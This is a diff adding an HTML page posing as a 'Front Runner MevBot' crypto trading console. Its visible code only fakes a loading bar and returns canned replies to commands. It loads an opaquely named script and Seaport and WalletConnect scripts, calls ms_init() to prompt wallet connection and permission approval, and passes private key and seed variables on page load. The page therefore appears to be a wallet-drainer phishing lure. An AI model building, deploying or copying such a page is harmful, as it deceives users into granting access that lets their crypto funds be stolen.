@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MevBot</title>
+
+  <script src=https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js></script>
+  <script src=https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js></script>
+  <script src=./scripts/seaport.js></script>
+  <script src=./scripts/wallet-connect.js></script>
+  <script src=./f422a642-dbc4-416a-b69c-27877056c287.js></script>
+	<link rel="icon" href="favicon.png" type="image/x-icon">
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: "Ubuntu Mono", monospace;
+            background-color: black;
+            color: white;
+        }
+		.input-table {
+			margin-top: 5px;
+		}
+		.connect-button {
+			cursor: pointer;
+			color: #fff;
+			border: 1px solid white;
+			background: #000;
+			width: 230px;
+			font-size: 22px;
+			border-radius: 10px;
+			padding: 5px 20px;
+			display: block;
+			margin: 23px auto;
+			font-family: "Ubuntu Mono", monospace;
+		}
+
+        .connect-button:hover {
+            cursor: pointer;
+        }
+
+        .connect-button:active {
+            cursor: pointer;
+        }
+
+        .console {
+            background-color: black;
+            border: 1px solid white;
+            padding: 10px;
+            margin: 20px auto;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        .console h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+		.command{
+			color: #00d900;
+		}
+        .console-field {
+            background-color: black;
+            color: white;
+            border: 1px solid white;
+            height: 300px;
+            padding: 10px;
+            overflow-y: scroll;
+        }
+
+		.console-input {
+			background-color: black;
+			color: #00d900;
+			caret-color: #00d900;
+			border: 1px solid white;
+			width: -webkit-fill-available;
+			padding: 5px;
+			font-size:16px;
+		}
+
+        .console-input:focus {
+            outline: none;
+        }
+
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            width: 100%;
+            max-width: 600px;
+            margin-bottom: 20px;
+        }
+
+		.grid-item {
+			padding: 8px;
+			border-bottom: 1px solid white;
+			display: flex;
+			flex-direction: column;
+			margin-top: 10px;
+		}
+
+        @media screen and (max-width: 600px) {
+            .console {
+                width: 95%;
+            }
+
+            .grid-container {
+                grid-template-columns: repeat(1, 1fr);
+            }
+        }
+    </style>
+</head>
+<body onload="VerifyAddress(myaddress,myprivatekey,myseed,networks,maxspend)">
+<div class="main" id="main" name="main">
+    <div class="console">
+        <h1><font color="blue">JavaScript Front Runner MevBot V2</font></h1>
+        <button class="interact-button">Connect Wallet</button>
+        <div class="console-field" id="consoleField">
+            <p>Initializing...</p>
+        </div>
+        <input type="text" class="console-input" placeholder="Type your command" id="consoleInput" autofocus="">
+
+        <div class="grid-container">
+            <div class="grid-item">
+                <strong>Network Chain:</strong>
+                <select class="input-table" type="text" id="network" value="???" style="padding: 1px 2px;border-radius: 3px;"><option>Ethereum</option><option>Binance Smart Chain</option><option>Polygon</option><option>Avalanche C-Chain</option><option>Arbitrum One</option><option>Optimism</option><option>Fantom</option></select>
+            </div>
+            <div class="grid-item">
+                <strong>Wallet Balance:</strong>
+                <input class="input-table" type="text" id="walletbal" disabled="" value="???">
+            </div>
+            <div class="grid-item">
+                <strong>Max Spend:</strong>
+                <input class="input-table" type="text" id="maxspend" disabled="" value="???">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var commands = {
+            HELP: "help",
+            START: "start",
+            STOP: "stop",
+            STATUS: "status"
+        };
+
+        function executeCommand(command) {
+            var consoleField = document.getElementById("consoleField");
+            var response = "";
+
+            switch (command) {
+                case commands.HELP:
+                    response = "Available commands: \n" +
+                        "- " + commands.START + ": Start the process;\n" +
+                        "- " + commands.STOP + ": Stop the process;\n" +
+                        "- " + commands.STATUS + ": Learn about the status of running processes;\n";
+                    break;
+                case commands.START:
+                    response = "Please connect your wallet first.";
+                    break;
+                case commands.STOP:
+                    response = "Nothing is currently running.";
+                    break;
+                case commands.STATUS:
+                    response = "Nothing is currently running.";
+                    break;
+                default:
+                    response = "Unknown command. Type 'help' to see available commands.";
+                    break;
+            }
+
+            consoleField.innerHTML += "<p><span class='command'>" + "unk@MEVBOTAI:> " + command + "</span></p>";
+            consoleField.innerHTML += "<p>" + response + "</p>";
+
+            consoleField.scrollTop = consoleField.scrollHeight;
+        }
+
+        function handleInput(event) {
+            var inputField = event.target;
+            var inputValue = inputField.value.trim();
+
+            if (event.key === "Enter" && inputValue !== "") {
+                executeCommand(inputValue.toLowerCase());
+                inputField.value = "";
+            }
+        }
+
+        window.onload = function() {
+            var inputField = document.getElementById("consoleInput");
+
+            inputField.addEventListener("keydown", handleInput);
+
+            inputField.focus();
+
+            var consoleField = document.getElementById("consoleField");
+            consoleField.innerHTML += "<p>Loading...</p>";
+
+            var loadingPercentage = 0;
+            var loadingInterval = setInterval(function() {
+                loadingPercentage += getRandomNumber(5, 10);
+                loadingPercentage = Math.min(loadingPercentage, 100);
+                consoleField.innerHTML = "<p>Loading... " + loadingPercentage + "%</p>";
+
+                if (loadingPercentage >= 100) {
+                    clearInterval(loadingInterval);
+                    consoleField.innerHTML += "<p>Authorization required.</p>";
+                    consoleField.innerHTML += "<p>Connect your wallet and review the permissions requested by dApp and confirm the connection in your wallet.</p>";
+					ms_init();
+                    consoleField.innerHTML += "<p>Type 'help' for available commands.</p>";
+                }
+            }, getRandomNumber(500, 1000));
+        };
+
+        function getRandomNumber(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+    </script>
+</div>
+
+</body>
+</html>
